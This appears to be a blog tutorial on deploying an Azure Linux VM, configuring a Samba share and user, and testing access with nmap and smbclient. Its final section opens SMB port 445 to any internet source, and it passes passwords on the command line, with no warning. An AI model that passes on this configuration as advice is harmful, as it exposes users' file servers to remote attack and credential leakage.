-<h2 id="prerequisites">Prerequisites</h2>
-<p>The one and only prerequisite is:</p>
-<ul>
-<li>Azure Account</li>
-</ul>
-<p>Also, since this post won&rsquo;t be detailed step by step, I&rsquo;ll assume that you have:</p>
-<ul>
-<li>Basic knowledge of Azure, at least menu navigation and creating a resource group.</li>
-<li>Basic knowledge of Linux</li>
-</ul>
-<p>Let&rsquo;s jump in!</p>
-<h2 id="vm-configuration--deploy">VM Configuration &amp; Deploy</h2>
-<p>At this step, I already have a resource group called <code>IAMF_SMB-TEST</code> and I&rsquo;ll be creating a VM instance inside this resource. It&rsquo;s a small server used by 4-5 users, so B1s will be enough. You&rsquo;re free to customize the VM.</p>
-<p>The VM details of mine can be seen in the following image:</p>
-<p><img class="img-container" src="imgs/image-20210513170545346.png" alt="image-20210513170545346"  />
-</p>
-<p>For authentication to the server, I&rsquo;ll be using an SSH public key here instead of a password. The account for server administration is called <code>azure-smb</code>. Since the authentication is SSH, this VM will have an SSH port open publicly (internet).</p>
-<p><img class="img-container" src="imgs/image-20210513170638603.png" alt="image-20210513170638603"  />
-</p>
-<p>In the following section, I&rsquo;ll use a standard SSD and leave the other settings at their defaults.</p>
-<p><img class="img-container" src="imgs/image-20210513170710958.png" alt="image-20210513170710958"  />
-</p>
-<p>In the <strong>Networking</strong> section, I&rsquo;ll just create a new virtual network. See the following image for details:</p>
-<p><img class="img-container" src="imgs/image-20210513170824172.png" alt="image-20210513170824172"  />
-</p>
-<p>In the <strong>Management</strong> section, because it will be temporary, I&rsquo;ll just disable the boot diagnostics.</p>
-<p><img class="img-container" src="imgs/image-20210513171009570.png" alt="image-20210513171009570"  />
-</p>
-<p>I&rsquo;ll leave the <strong>Advanced</strong> with the default settings and skip the <strong>Tags</strong> section.</p>
-<p>The last section is <strong>Review + Create</strong>, which basically reviews the VM configuration. After I finish the review, I&rsquo;ll press the <strong>Create</strong> button.</p>
-<p><img class="img-container" src="imgs/image-20210513171153896.png" alt="image-20210513171153896"  />
-</p>
-<p>When the <strong>Create</strong> button is clicked, the VM will be automatically deployed.</p>
-<p><img class="img-container" src="imgs/image-20210513171501031.png" alt="image-20210513171501031"  />
-</p>
-<h2 id="vm-login-via-ssh">VM Login via SSH</h2>
-<p>The next step is to login to the deployed VM instance via SSH using the previously created username and key/password. The public IP of the VM instance can be found at the <code>Dashboard</code> &gt; <code>RESOURCE_GROUP_NAME</code> &gt; <code>PUBLIC_IP_NAME</code>. In my case, it is <code>Dashboard</code> &gt; <code>IAMF_SMB-TEST</code> &gt; <code>smb-server-ip</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ssh -i private_key azure-smb@PUBLIC_IP_ADDRESS
-</code></pre></div><p><img class="img-container" src="imgs/image-20210513171606268.png" alt="image-20210513171606268"  />
-</p>
-<h2 id="smb-configuration">SMB Configuration</h2>
-<h3 id="installation-and-initial-setup">Installation and Initial Setup</h3>
-<p>First thing first, let&rsquo;s update the repository list.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo apt update
-</code></pre></div><p>After that, install <code>Samba</code> with the following command.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo apt install samba
-</code></pre></div><p>Once the installation is done, check the Samba service daemon status.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo systemctl status smbd
-● smbd.service - Samba SMB Daemon
-   Loaded: loaded <span style="color:#f92672">(</span>/lib/systemd/system/smbd.service; enabled; vendor preset: enabled<span style="color:#f92672">)</span>
-   Active: active <span style="color:#f92672">(</span>running<span style="color:#f92672">)</span> since Thu 2021-05-13 10:17:45 UTC; 3min 48s ago
-     Docs: man:smbd<span style="color:#f92672">(</span>8<span style="color:#f92672">)</span>
-           man:samba<span style="color:#f92672">(</span>7<span style="color:#f92672">)</span>
-           man:smb.conf<span style="color:#f92672">(</span>5<span style="color:#f92672">)</span>
- Main PID: <span style="color:#ae81ff">2098</span> <span style="color:#f92672">(</span>smbd<span style="color:#f92672">)</span>
-   Status: <span style="color:#e6db74">&#34;smbd: ready to serve connections...&#34;</span>
-    Tasks: <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>limit: 1056<span style="color:#f92672">)</span>
-   CGroup: /system.slice/smbd.service
-           ├─2098 /usr/sbin/smbd --foreground --no-process-group
-           ├─2123 /usr/sbin/smbd --foreground --no-process-group
-           ├─2124 /usr/sbin/smbd --foreground --no-process-group
-           └─2129 /usr/sbin/smbd --foreground --no-process-group
-
-May <span style="color:#ae81ff">13</span> 10:17:44 smb-server systemd<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>: Starting Samba SMB Daemon...
-May <span style="color:#ae81ff">13</span> 10:17:45 smb-server systemd<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>: Started Samba SMB Daemon.
-</code></pre></div><p>Samba is ready, and now let&rsquo;s configure the share folder.</p>
-<h3 id="shares-configuration">Shares Configuration</h3>
-<p>First, let&rsquo;s create a backup file of the original configuration, so we can reset it to the default configuration, just in case something goes wrong.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo cp /etc/samba/smb.conf<span style="color:#f92672">{</span>,.backup<span style="color:#f92672">}</span>
-</code></pre></div><p>Now create a share folder name it <code>sambashare</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ mkdir sambashare
-</code></pre></div><p>Then open the samba configuration file with a text editor like <code>nano</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo nano /etc/samba/smb.conf
-</code></pre></div><p>Go straight to the bottom of the file and add the following lines.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">[</span>sambashare<span style="color:#f92672">]</span>
-    comment <span style="color:#f92672">=</span> Samba Share
-    path <span style="color:#f92672">=</span> /home/azure-smb/sambashare
-    read only <span style="color:#f92672">=</span> no
-    browsable <span style="color:#f92672">=</span> yes
-</code></pre></div><p>Details for configuring share can be read <a href="https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html">here</a> or <a href="https://web.mit.edu/rhel-doc/5/RHEL-5-manual/Deployment_Guide-en-US/s1-samba-configuring.html">here</a>.</p>
-<p>Save the file and restart the SMB daemon with the following command:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo service smbd restart
-</code></pre></div><p>Lastly, update the firewall to allow network traffic for Samba/SMB.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo ufw allow samba
-</code></pre></div><p>This is the basic configuration of creating a Samba share, but from here you can create another share with more complex configuration. Here are my references:</p>
-<ul>
-<li><a href="https://linuxize.com/post/how-to-install-and-configure-samba-on-ubuntu-18-04/">https://linuxize.com/post/how-to-install-and-configure-samba-on-ubuntu-18-04/</a></li>
-<li><a href="https://confluence.jaytaala.com/display/TKB/Create+samba+share+writeable+by+all%2C+group%2C+or+only+a+user">https://confluence.jaytaala.com/display/TKB/Create+samba+share+writeable+by+all%2C+group%2C+or+only+a+user</a></li>
-<li><a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-a-samba-share-for-a-small-organization-on-ubuntu-16-04">https://www.digitalocean.com/community/tutorials/how-to-set-up-a-samba-share-for-a-small-organization-on-ubuntu-16-04</a></li>
-</ul>
-<h3 id="add-samba-user">Add Samba User</h3>
-<p>Currently, our Linux account for administering the server is <code>azure-smb</code> and we can&rsquo;t use this account password to access the SMB shares yet. Instead, we need to create a password and bind it to <code>azure-smb</code>.</p>
-<p>But now, let&rsquo;s just create a dedicated user for SMB called <code>user1</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo useradd --system -s /usr/sbin/nologin user1
-</code></pre></div><p>Assign <code>user1</code> to be the owner of the share</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo chown user1 /home/azure-smb/sambashare
-</code></pre></div><p>After that, create a Samba password for <code>user1</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo smbpasswd -a user1
-New SMB password: 
-Retype new SMB password: 
-Added user user1.
-</code></pre></div><p>Finally, enable the user.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo smbpasswd -e user1
-Enabled user user1.
-</code></pre></div><h2 id="expose-to-internet">Expose to Internet</h2>
-<h3 id="allow-inbound-connection">Allow Inbound Connection</h3>
-<p>Now if we want to make it available on the Internet, we have to go back to the Azure Portal to open the SMB port (445) on the NIC Public IP and allow inbound connection through that port. The connection is then forwarded to our SMB port on the NIC Private IP.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">PUBLIC_IP:445 --&gt; PRIVATE_IP:445
-</code></pre></div><p>To do that open up the Networking settings of the SMB VM and click on <strong>Add inbound port rule</strong> button.</p>
-<p><img class="img-container" src="imgs/image-20210513173838694.png" alt="image-20210513173838694"  />
-</p>
-<p>On the new Windows, configure the rule to allow any source (incoming IP) and any source port (incoming port) to connect to the SMB port (445). The details configuration is as follows:</p>
-<p><img class="img-container" src="imgs/image-20210513173858659.png" alt="image-20210513173858659"  />
-</p>
-<p>At the bottom, the configuration is as follows:</p>
-<p><img class="img-container" src="imgs/image-20210513173929271.png" alt="image-20210513173929271"  />
-</p>
-<p>When you&rsquo;re done, click on the <strong>Add</strong> button and the new rule should listed in the <strong>Inbound port rules</strong> section.</p>
-<p><img class="img-container" src="imgs/image-20210513174018895.png" alt="image-20210513174018895"  />
-</p>
-<h3 id="test-access">Test Access</h3>
-<p>We can use Nmap to see if the SMB port has been opened.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ nmap -p445 -sV VM_PUBLIC_IP
-</code></pre></div><p><img class="img-container" src="imgs/image-20210513174227862.png" alt="image-20210513174227862"  />
-</p>
-<p>To interact with the SMB server via CLI, you can use <code>smbclient</code>. Install it with:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ sudo apt install smbclient
-</code></pre></div><p>Once it installed, connect to the share with following command:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ smbclient //<span style="color:#f92672">[</span>IP<span style="color:#f92672">]</span>/<span style="color:#f92672">[</span>sharename<span style="color:#f92672">]</span> 
-</code></pre></div><p>Adding <code>-N -L</code> can list all the available shares.</p>
-<p><img class="img-container" src="imgs/image-20210513174416250.png" alt="image-20210513174416250"  />
-</p>
-<p>You can also provide the password directly in the terminal:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ smbclient //<span style="color:#f92672">[</span>IP<span style="color:#f92672">]</span>/<span style="color:#f92672">[</span>sharename<span style="color:#f92672">]</span> -U <span style="color:#f92672">[</span>username<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>password<span style="color:#f92672">]</span>
-$ smbclient //<span style="color:#f92672">[</span>IP<span style="color:#f92672">]</span>/<span style="color:#f92672">[</span>sharename<span style="color:#f92672">]</span> -U <span style="color:#e6db74">&#39;username%password&#39;</span>
-</code></pre></div><p>And that&rsquo;s all. It is not that detailed, but I hope you will find it useful.</p>
 ]]></content:encoded>
     </item>
     
